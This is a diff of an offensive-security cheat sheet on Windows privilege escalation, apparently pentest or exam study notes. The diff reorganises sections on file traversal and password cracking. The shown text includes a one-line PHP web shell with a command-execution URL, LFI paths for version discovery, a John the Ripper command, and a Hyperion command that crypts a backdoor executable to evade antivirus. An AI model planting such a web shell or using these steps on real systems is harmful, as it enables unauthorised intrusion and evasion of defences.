@@ -1,9 +1,21 @@
 # ariel-shin Windows - Privilege Escalation
 
 ## Summary 
-* [Tools](#tools)
+* [Web Shell for Windows](#Web-Shell-for-Windows)
+* [File Traversal / Local File Inclusion](#File-Traversal-/-Local-File-Inclusion)
+* [Cracking Passwords](#Cracking-Passwords)
+* [RCE to Shell](#RCE-to-Shell)
+* [Useful commands](#Useful-commands)
+* [Transfer files](#Transfer-files)
+* [Process](#Process)
+* [Bypassing AV](#Bypassing-AV)
+* [Automated Tools](#Automated-Tools)
+* [Cheat Sheets](#Cheat-Sheets)
+* [Links](#Links)
+* [Nothing is working --> SOS](#Nothing-is-working--->-SOS)
 
 ## MUST RUN: ipconfig/ifconfig && whoami && cat local.txt
+## MUST RUN: ipconfig/ifconfig && whoami && cat proof.txt
 
 ## Web Shell for Windows 
 PHP Web Shell
@@ -16,6 +28,22 @@ PHP Web Shell
 <?php echo(system($_GET["cmd"])); ?>
 ```
 - Go to http://victimsite.com/test.php?cmd=dir for command execution 
+
+## File Traversal / Local File Inclusion
+* Use \~1 with filenames and spaces
+* Discover version 
+```windows
+C:\Windows\System32/license.rtf //for Windows 7
+C:\Windows\System32\eula.txt //for Windows XP 
+```
+
+## Cracking Passwords
+* Google it
+* Search on hashkiller.co.uk
+* John The Ripper
+```
+john textfile
+```
 
 ## RCE to Shell
 * Getting a shell in limited interpreters
@@ -370,22 +398,6 @@ $ netsh firewall show config
 ```
 $ wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe
 
-```
-
-## File Traversal / Local File Inclusion
-* Use \~1 with filenames and spaces
-* Discover version 
-```windows
-C:\Windows\System32/license.rtf //for Windows 7
-C:\Windows\System32\eula.txt //for Windows XP 
-```
-
-## Cracking Passwords
-* Google it
-* Search on hashkiller.co.uk
-* John The Ripper
-```
-john textfile
 ```
 
 ## Automated Tools
